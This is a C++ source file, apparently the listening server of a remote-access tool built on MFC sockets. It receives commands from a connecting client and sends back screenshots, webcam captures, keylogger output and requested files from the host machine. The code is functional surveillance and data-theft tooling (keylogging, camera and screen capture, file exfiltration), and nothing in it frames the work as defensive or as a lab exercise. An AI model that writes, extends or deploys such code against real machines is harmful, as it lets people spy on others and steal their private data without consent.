#include "utils.h"

int main() {
    // Init socket
    if (!AfxSocketInit()) {
        cerr << "\nFailed to initialize sockets. Error: " << GetLastError() << endl;
        return -1;
    }

    // Create server socket
    CSocket server;
    if (!server.Create(PORT)) {
        cerr << "\nFailed to create server socket. Error: " << GetLastError() << endl;
        return -1;
    }

    // Listen for connection
    if (!server.Listen()) {
        cerr << "\nServer failed to listen. Error: " << GetLastError() << endl;
        return -1;
    }
    cout << "\nServer is listening on port " << PORT << "...\n";
        
    char buffer[BUFFER_SIZE]{ 0 };
    string cmd, opt;
    while (cmd != "exit" && cmd != "power") {
        // Accept client connection
        CSocket client;
        if (!server.Accept(client)) {
            cerr << "\nFailed to accept client connection. Error: " << GetLastError() << endl;
            return -1;
        }
        cout << "\nClient connected!\n";

        // Receive message from client
        client.Receive(buffer, BUFFER_SIZE);
        cout << "\nReceived from client: " << buffer << endl;

        // Reset state
        opt = "";
        inp.clear();
        
        // Parse message to stringstream for extracting command
        inp.str(buffer);
        inp >> cmd >> opt;

        try {
            // Call corresponding handler
            handlers[cmd][opt]();

            // Send message to client
            string response = out.str();
            out.str("");
            client.Send(response.c_str(), static_cast<int>(response.size()) + 1);

            // Send file if needed
            if (opt == "screen") {
                sendFile(client, screenCapturePath);
            }
            else if (opt == "camera") {
                sendFile(client, webcamCapturePath);
            }
            else if (cmd == "stop" && opt == "keylogger") {
                sendFile(client, keyloggerCapturePath);
            }
            else if (opt == "get") {
                sendFile(client, requestFilePath);
            }
        }
        catch (const exception& e) {
            if (strcmp(e.what(), "bad function call")) {
                out << e.what() << endl;
            }
            else {
                out << "Invalid command!\n\n";
                getInstruction();
            }

            // Send message to client
            string response = out.str();
            out.str("");
            client.Send(response.c_str(), static_cast<int>(response.size()) + 1);
        }
        
        // Close client socket
        cout << "\nClient disconnected!\n";
        client.ShutDown();
        client.Close();
    }

    // Close server socket
    cout << "\nServer stopped!\n";
    server.ShutDown();
    server.Close();

    return 0;
}